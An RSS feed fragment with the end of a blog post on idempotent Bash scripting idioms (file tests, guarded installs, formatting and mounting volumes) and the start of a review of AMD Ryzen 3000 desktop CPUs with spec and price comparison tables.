&lt;p&gt;Here the &lt;code&gt;-q&lt;/code&gt; means silent mode and &lt;code&gt;-F&lt;/code&gt; enables &lt;code&gt;fixed string&lt;/code&gt; mode. Grep will silently fail if &lt;code&gt;/mnt/dev&lt;/code&gt; doesn’t exist so the echo statement will never be called.&lt;/p&gt;
&lt;h3 id=&quot;check-if-variable-file-or-dir-exists&quot;&gt;Check if variable, file or dir exists&lt;/h3&gt;
&lt;p&gt;Most of the time you’re writing to a directory, reading from a file or doing simple string manipulations with a variable. For example you might have a tool that creates a new file based on certain inputs:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;complex set of rules&quot;&lt;/span&gt; &amp;gt; /etc/conf/foo.txt&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Calculating the text might be an expensive operation, hence you don’t want to write it every time you call the script. To make it idempotent you check if the file exists via the &lt;code&gt;-f&lt;/code&gt; flag of the inbuilt &lt;code&gt;test&lt;/code&gt; property of the shell:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; ! -f &lt;span class=&quot;s2&quot;&gt;&quot;/etc/conf/foo.txt&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;complex set of rules&quot;&lt;/span&gt; &amp;gt; /etc/conf/foo.txt
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here &lt;code&gt;-f&lt;/code&gt; is just an example, there are many other flags you can use, such:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;-d&lt;/code&gt;: directory&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-z&lt;/code&gt;: string of zero length&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p&lt;/code&gt;: pipe&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-x&lt;/code&gt;: file and has execute permission&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;For example suppose you want to install a binary, but only if it doesn’t exist in your host, you can use the &lt;code&gt;-x&lt;/code&gt; like this:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# install 1password CLI&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; ! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -x &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt; -v op&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;OP_VERSION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;v0.5.6-003&quot;&lt;/span&gt;
  curl -sS -o 1password.zip https://cache.agilebits.com/dist/1P/op/pkg/&lt;span class=&quot;si&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;OP_VERSION&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;/op_linux_amd64_&lt;span class=&quot;si&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;OP_VERSION&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;.zip
  unzip 1password.zip op -d /usr/local/bin
  rm -f 1password.zip
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This installs the &lt;code&gt;op&lt;/code&gt; binary to /usr/local/bin. If you re-run your script, it won’t install it anymore. Another benefit is, you can easily upgrade the binary to a new version by just removing it from your system, update the &lt;code&gt;OP_VERSION&lt;/code&gt; env and re-run your script.&lt;/p&gt;
&lt;p&gt;For a list of complete flags and operators checkout &lt;code&gt;man test&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&quot;formatting-a-device&quot;&gt;Formatting a device&lt;/h3&gt;
&lt;p&gt;To format a volume, say with an &lt;code&gt;ext4&lt;/code&gt; format, you can use a command like the following:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;mkfs.ext4 &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$VOLUME_NAME&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Of course, this would fail immediately if you call it again. To make this call idempotent, we prepend it with &lt;code&gt;blkid&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;blkid &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$VOLUME_NAME&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; mkfs.ext4 &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$VOLUME_NAME&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This command prints attributes for a given block device. Hence prepending basically means to proceed with formatting &lt;em&gt;only&lt;/em&gt; when &lt;code&gt;blkid&lt;/code&gt; fails, which is an indication that the given volume is not formatted yet.&lt;/p&gt;
&lt;h3 id=&quot;mounting-a-device&quot;&gt;Mounting a device&lt;/h3&gt;
&lt;p&gt;Trying to mount a volume to an existing directory can be done with the following example command:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;mount -o discard,defaults,noatime &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$VOLUME_NAME&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DATA_DIR&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will fail however if it’s already mounted. One way is to check the output of &lt;code&gt;mount&lt;/code&gt; command and see if the volume is already mounted. But there is a better way to do it. Using the &lt;code&gt;mountpoint&lt;/code&gt; command:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;chroma&quot;&gt;
&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; ! mountpoint -q &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DATA_DIR&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
  mount -o discard,defaults,noatime &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$VOLUME_NAME&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DATA_DIR&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;mountpoint&lt;/code&gt; command checks whether a file or directory is a mount point. The &lt;code&gt;-q&lt;/code&gt; flag just makes sure it doesn’t output anything and silently exits. In this case, if the mount point doesn’t exist, it’ll go forward and mount the volume.&lt;/p&gt;
&lt;h2 id=&quot;verdict&quot;&gt;Verdict&lt;/h2&gt;
&lt;p&gt;Most of these tips and tricks are already known, but when we write Bash scripts those can be easily neglected without even thinking about it. Some of these idioms are very specific (such as mounting or formatting), but as we saw, creating idempotent and resilient software is always beneficial in the long term. So knowing them is useful nevertheless.&lt;/p&gt;
&lt;p&gt;I used all of the above tips and tricks recently in my &lt;a href=&quot;https://github.com/fatih/dotfiles/blob/master/workstation/bootstrap.sh&quot;&gt;&lt;code&gt;bootstrap.sh&lt;/code&gt;&lt;/a&gt; script that I use to create and provision my &lt;a href=&quot;https://arslan.io/2019/01/07/using-the-ipad-pro-as-my-development-machine/&quot;&gt;remote development machine&lt;/a&gt;. I know that I could use more sophisticated tools to provision a VM from scratch, but sometimes a simple bash script is the only thing you need.&lt;/p&gt;
&lt;/div&gt;&lt;p&gt;If you have any questions or feedback, please feel free to share it with me on Twitter: &lt;strong&gt;&lt;a href=&quot;https://twitter.com/fatih&quot;&gt;@fatih&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;</description>
<pubDate>Sun, 07 Jul 2019 14:24:06 +0000</pubDate>
<dc:creator>kiyanwang</dc:creator>
<dc:language>en-us</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://arslan.io/2019/07/03/how-to-write-idempotent-bash-scripts/</dc:identifier>
</item>
<item>
<title>The AMD 3rd Gen Ryzen Deep Dive Review: 3700X and 3900X Raising the Bar</title>
<link>https://www.anandtech.com/show/14605/the-ryzen-3700x-3900x-review-amd-done-did-it</link>
<guid isPermaLink="true" >https://www.anandtech.com/show/14605/the-ryzen-3700x-3900x-review-amd-done-did-it</guid>
<description>&lt;p&gt;It’s the review we’ve all been waiting for. Since December last year – and particularly since CES – AMD has been teasing us about the new Zen 2 microarchitecture and AMD’s newest Ryzen 3000 series of CPUs. Incorporating a significantly upgraded CPU architecture and built using TSMC's latest generation manufacturing process, AMD has continued to run at full speed at a time when rival Intel has struggled to move at all. The end result is that while the first and second generation of Ryzen CPUs were all about AMD returning to competition and eating into Intel's substantial performance lead, the Ryzen 3000 series is nothing less than AMD's first shot in nearly &lt;a href=&quot;https://www.anandtech.com/show/2045&quot;&gt;13 years&lt;/a&gt; at meeting (or beating) Intel at their own game in the desktop CPU market. It's a big moment for AMD, and an exciting one in the CPU industry as a whole.&lt;/p&gt;
&lt;p&gt;The new Ryzen 3000 chips mark the first &quot;big&quot; leap for AMD since they introduced &lt;a href=&quot;https://www.anandtech.com/show/11170/the-amd-zen-and-ryzen-7-review-a-deep-dive-on-1800x-1700x-and-1700&quot;&gt;their first Ryzen processors a bit over two years ago&lt;/a&gt;. Unlike last year's Ryzen 2000 series, which was a more minor refresh and brought some tweaks to the microarchitecture and process node, this year’s Ryzen 3000 is a major upgrade for both CPU architecture as well as on the manufacturing node. It marks AMD’s switch from GlobalFoundries' 12nm process to TSMC’s newest 7nm node. But what’s more exciting is how AMD was able to actually implement this switch: Ryzen 3000 isn’t merely a single chip, but a collection of non-uniform chiplets, introducing this design paradigm in a consumer product for the first time.&lt;/p&gt;
&lt;p&gt;Today AMD launches its entire new CPU lineup and platform, alongside the new Navi-based Radeon RX 5700 series. In terms of CPU coverage, we’ll be taking a closer look at the new flagship, the $499 12-core Ryzen 3900X, as well as the $329 8-core Ryzen 7 3700X and its peculiar low TDP of 65W.&lt;/p&gt;
&lt;h3&gt;The CPU Line-up&lt;/h3&gt;
&lt;table border=&quot;0&quot; width=&quot;85%&quot;&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr class=&quot;tgrey&quot; readability=&quot;2&quot;&gt;&lt;td colspan=&quot;12&quot;&gt;AMD 'Matisse' Ryzen 3000 Series CPUs&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;tlblue&quot;&gt;&lt;td colspan=&quot;2&quot; rowspan=&quot;1&quot;&gt;&lt;em&gt;&lt;small&gt;AnandTech&lt;/small&gt;&lt;/em&gt;&lt;/td&gt;
&lt;td colspan=&quot;2&quot;&gt;Cores&lt;br/&gt;Threads&lt;/td&gt;
&lt;td&gt;Base&lt;br/&gt;Freq&lt;/td&gt;
&lt;td&gt;Boost&lt;br/&gt;Freq&lt;/td&gt;
&lt;td&gt;L2&lt;br/&gt;Cache&lt;/td&gt;
&lt;td&gt;L3&lt;br/&gt;Cache&lt;/td&gt;
&lt;td&gt;PCIe&lt;br/&gt;4.0&lt;/td&gt;
&lt;td&gt;Chiplets&lt;br/&gt;IO+CPU&lt;/td&gt;
&lt;td&gt;TDP&lt;/td&gt;
&lt;td&gt;Price&lt;br/&gt;(SEP)&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tlgrey&quot;&gt;Ryzen 9&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;3950X&lt;/td&gt;
&lt;td&gt;16C&lt;/td&gt;
&lt;td&gt;32T&lt;/td&gt;
&lt;td&gt;3.5&lt;/td&gt;
&lt;td&gt;4.7&lt;/td&gt;
&lt;td&gt;8 MB&lt;/td&gt;
&lt;td&gt;64 MB&lt;/td&gt;
&lt;td&gt;16+4+4&lt;/td&gt;
&lt;td&gt;1+2&lt;/td&gt;
&lt;td&gt;105W&lt;/td&gt;
&lt;td&gt;$749&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tlgrey&quot;&gt;Ryzen 9&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;3900X&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;12C&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;24T&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;3.8&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;4.6&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;6 MB&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;64 MB&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;16+4+4&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;1+2&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;105W&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;$499&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tlgrey&quot;&gt;Ryzen 7&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;3800X&lt;/td&gt;
&lt;td&gt;8C&lt;/td&gt;
&lt;td&gt;16T&lt;/td&gt;
&lt;td&gt;3.9&lt;/td&gt;
&lt;td&gt;4.5&lt;/td&gt;
&lt;td&gt;4 MB&lt;/td&gt;
&lt;td&gt;32 MB&lt;/td&gt;
&lt;td&gt;16+4+4&lt;/td&gt;
&lt;td&gt;1+1&lt;/td&gt;
&lt;td&gt;105W&lt;/td&gt;
&lt;td&gt;$399&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tlgrey&quot;&gt;Ryzen 7&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;3700X&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;8C&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;16T&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;3.6&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;4.4&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;4 MB&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;32 MB&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;16+4+4&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;1+1&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;65W&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;$329&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tlgrey&quot;&gt;Ryzen 5&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;3600X&lt;/td&gt;
&lt;td&gt;6C&lt;/td&gt;
&lt;td&gt;12T&lt;/td&gt;
&lt;td&gt;3.8&lt;/td&gt;
&lt;td&gt;4.4&lt;/td&gt;
&lt;td&gt;3 MB&lt;/td&gt;
&lt;td&gt;32 MB&lt;/td&gt;
&lt;td&gt;16+4+4&lt;/td&gt;
&lt;td&gt;1+1&lt;/td&gt;
&lt;td&gt;95W&lt;/td&gt;
&lt;td&gt;$249&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tlgrey&quot;&gt;Ryzen 5&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;3600&lt;/td&gt;
&lt;td&gt;6C&lt;/td&gt;
&lt;td&gt;12T&lt;/td&gt;
&lt;td&gt;3.6&lt;/td&gt;
&lt;td&gt;4.2&lt;/td&gt;
&lt;td&gt;3 MB&lt;/td&gt;
&lt;td&gt;32 MB&lt;/td&gt;
&lt;td&gt;16+4+4&lt;/td&gt;
&lt;td&gt;1+1&lt;/td&gt;
&lt;td&gt;65W&lt;/td&gt;
&lt;td&gt;$199&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;AMD is launching 5 different SKUs today, with the 16-core Ryzen 9 3950X set to follow sometime in September. For today's launch AMD sampled the R9 3900X and R7 3700X, and we took them for a ride in the limited time we had with them, covering as much as we could.&lt;/p&gt;
&lt;p&gt;Starting at the top we have the Ryzen 3900X, which is a 12-core design. In fact it's the first 12-core processor in a standard desktop socket, and it rather unique within AMD's product stack because it is currently the only SKU which takes full advantage of AMD’s newest chiplet architecture. Whereas all the other Ryzen parts are comprised of two chiplets – the base I/O die and a single CPU chiplet – 3900X comes with two such CPU chiplets, granting it (some of) the extra cores and the 64MB of L3 cache that entails.&lt;/p&gt;
&lt;p&gt;Interestingly, while AMD has increased the core-count by 50% over its previous flagship processor, it has managed to keep the TDP to the same 105W as on the Ryzen 2700X. On top of this, the chip clocks in 300MHz faster than the predecessor in terms of boost clock, now reaching 4.6GHz; even the base clock has been increased by 100MHz, coming in at 3.8GHz. The big question then, is whether the new 7nm process node and Zen 2 are really this efficient, or should we be expecting more elevated power numbers?&lt;/p&gt;
&lt;p&gt;Meanwhile our second chip of the day is the new Ryzen 3700X, which is configured and positioned as a particularly efficient model. With a boost clock of 4.4GHz and a base clock of 3.6GHz, the part should still be notably faster than the Ryzen 2700X, yet AMD has managed to make this a 65W TDP part which is going to make for some interesting analysis.&lt;/p&gt;
&lt;h3&gt;Continued Execution&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://images.anandtech.com/doci/14525/Mark_Papermaster-Next_Horizon_Gaming-Architecture_06092019-page-003.jpg&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://images.anandtech.com/doci/14525/Mark_Papermaster-Next_Horizon_Gaming-Architecture_06092019-page-003_575px.jpg&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Today’s Zen 2 and Ryzen 3000 launch is another step forward on AMD’s roadmap. The company has been working on a very ambitious development roadmap for their CPU designs, and Zen 2 is the company's first chance to flex their muscles and do a full iteration on their CPU core design.&lt;/p&gt;
&lt;p&gt;Executing on this roadmap has been important for AMD both because it's helped them close the performance gap with Intel, and because it's helped to prove to customers (particularly hyperscalers and enterprises) that Zen wasn't a fluke, and that the company can reliably continue to improve its technology. This is especially noteworthy because while rival Intel hasn't been standing still, all of Intel's desktop technology for the last 3 years has been based on the same Skylake core architecture and variations on Intel's exceptional-for-the-time 14nm process. This will eventually change, as Intel gets their desktop house in order for 2020, but right now AMD is moving forward when Intel can not, allowing AMD to take full advantage of Intel's run of bad luck and wooing customers in the process.&lt;/p&gt;
&lt;p&gt;And of course, AMD isn't done here. For the company’s engineers, today’s chips are last year’s work, and the company is working on the next generation Zen 3 core. Zen 3 is still a full generation away – and today is all about Zen 2 – but AMD is making it clear that Zen 2 isn't the end of the road either, and that they are working to further improve their CPU microarchitecture and overall platform.&lt;/p&gt;
&lt;h3&gt;Large Performance Boosts, Particularly for Gaming&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://images.anandtech.com/doci/14525/Mark_Papermaster-Next_Horizon_Gaming-Architecture_06092019-page-017.jpg&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://images.anandtech.com/doci/14525/Mark_Papermaster-Next_Horizon_Gaming-Architecture_06092019-page-017_575px.jpg&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The 3&lt;sup&gt;rd&lt;/sup&gt; gen Ryzen processors promise to bring some notably large performance improvements for users. The Zen 2 core microarchitecture is said to bring over 10% IPC improvements; this together with the higher clockspeeds should make for some solid generational improvements in a lot of workloads. For gaming in particular, AMD claims that we should be seeing some large improvements – the doubled size of the L3 cache is said to have made a notable mark on a lot of gaming titles, with AMD claiming ~20% to even ~30% improvements in some titles when compared to the last generation Ryzen 2700X.&lt;/p&gt;
&lt;h2&gt;The Ryzen 3000 Competition: Intel's Coffee Lake Refresh&lt;/h2&gt;
&lt;p&gt;Positioning the Ryzen 3000 series against Intel’s line-up is a matter of both performance as well as price. AMD had already made comparisons between the new SKUs and Intel’s counterparts back at Computex, where we saw comparisons between similarly priced units. According to the company, even Intel's pricey Skylake high-end desktop (HEDT) processor, the Core i9-9920X, isn't entirely out of the line of fire of the Ryzen 3900X.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://images.anandtech.com/doci/14525/COMPUTEX_KEYNOTE_DRAFT_FOR_PREBRIEF.26.05.19-page-035b.jpg&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://images.anandtech.com/doci/14525/COMPUTEX_KEYNOTE_DRAFT_FOR_PREBRIEF.26.05.19-page-035b_575px.jpg&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;As a quick recap to where things stand, compared to its immediate predecessor, Intel’s Coffee Lake Refresh received quite a bump in terms of both clock frequencies as well core counts. This allowed Intel to erase any Ryzen 2000 series lead in multi-threaded performance, all the while still maintaining a comfortable lead in single-threaded performance.&lt;/p&gt;
&lt;p&gt;Against the Ryzen 3000 series, the Intel line-up will seemingly no longer have an IPC lead. AMD hasn’t been in such a situation since the Athlon 64 days well over 15 years ago, which is a remarkable turn of events. But with that said, make no mistake: IPC is just one half of the equation for single-threaded performance, and the other is raw frequency, and the Intel line-up still has a notable advantage thanks to its peak frequencies of up to 5GHz. So taking over Intel's single-threaded performance lead (at least on a consistent basis) is a tall order for the Ryzen 3000 series.&lt;/p&gt;
&lt;table border=&quot;0&quot; width=&quot;70%&quot;&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;tgrey&quot; readability=&quot;2&quot;&gt;&lt;td colspan=&quot;3&quot;&gt;Comparison: Ryzen 9 3900X vs Core i9-9900K&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;tlblue&quot;&gt;&lt;td width=&quot;35%&quot;&gt;AMD&lt;br/&gt;Ryzen 9 3900X&lt;/td&gt;
&lt;td width=&quot;30%&quot;&gt;Features&lt;/td&gt;
&lt;td width=&quot;35%&quot;&gt;Intel&lt;br/&gt;Core i9-9900K&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;12 / 24&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;Cores/Threads&lt;/td&gt;
&lt;td&gt;8 / 16&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;3.8 / 4.6 GHz&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;Base/Turbo&lt;/td&gt;
&lt;td&gt;3.6 / 5.0 GHz&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;16 (Free) + 4 (NVMe)&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;PCIe 4.0 Lanes&lt;/td&gt;
&lt;td&gt;16 (Free) Gen 3.0&lt;br/&gt;(No Gen 4.0)&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;512 KB/core&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;L2 Cache&lt;/td&gt;
&lt;td&gt;256 KB/core&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;4x 16 MB&lt;br/&gt;64 MB total&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;L3 Cache&lt;/td&gt;
&lt;td&gt;16 MB&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;105 W&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;TDP&lt;/td&gt;
&lt;td&gt;95 W&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;$499&lt;br/&gt;&lt;span&gt;(cooler included)&lt;/span&gt;&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;Price (List)&lt;/td&gt;
&lt;td&gt;$484&lt;br/&gt;(no cooler)&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;Taking a look at chip pricing and positioning then, the big flagship fight among desktop processors is going to be between the Ryzen 3900X at $484, and the i9-9900K at $484. Both of which happen to be the highest-end SKUs of their respective mainstream desktop computing platforms. It's to remembered that the AMD CPUs come with a good cooler included, while Intel's options don't include one, meaning one would have to spend extra in order to get the Intel system running.&lt;/p&gt;
&lt;p&gt;Here AMD should have a significant lead in terms of the multi-threaded performance of the new Ryzen 9 series as it’s able to employ 50% more cores than Intel, all while promising to remain in a similar TDP range of 105W vs 95W. We still expect the 9900K to win some workloads which are more lightly threaded simply due to Intel’s clock frequency lead, however this is something we’ll investigate more in detail in the coming benchmark analysis.&lt;/p&gt;
&lt;table border=&quot;0&quot; width=&quot;70%&quot;&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;tgrey&quot; readability=&quot;2&quot;&gt;&lt;td colspan=&quot;3&quot;&gt;Comparison: Ryzen 7 3700X vs Core i7-9700K&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;tlblue&quot;&gt;&lt;td width=&quot;35%&quot;&gt;AMD&lt;br/&gt;Ryzen 7 3700X&lt;/td&gt;
&lt;td width=&quot;30%&quot;&gt;Features&lt;/td&gt;
&lt;td width=&quot;35%&quot;&gt;Intel&lt;br/&gt;Core i7-9700K&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;8 / 16&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;Cores/Threads&lt;/td&gt;
&lt;td&gt;8 / 8&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;3.6 / 4.4 GHz&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;Base/Turbo&lt;/td&gt;
&lt;td&gt;3.6 / 4.9 GHz&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;16 (Free) + 4 (NVMe)&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;PCIe 4.0 Lanes&lt;/td&gt;
&lt;td&gt;16 (Free) Gen 3.0&lt;br/&gt;(No Gen 4.0)&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;512 KB/core&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;L2 Cache&lt;/td&gt;
&lt;td&gt;256 KB/core&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;2x 16 MB&lt;br/&gt;32MB total&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;L3 Cache&lt;/td&gt;
&lt;td&gt;12 MB&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;65 W&lt;/td&gt;
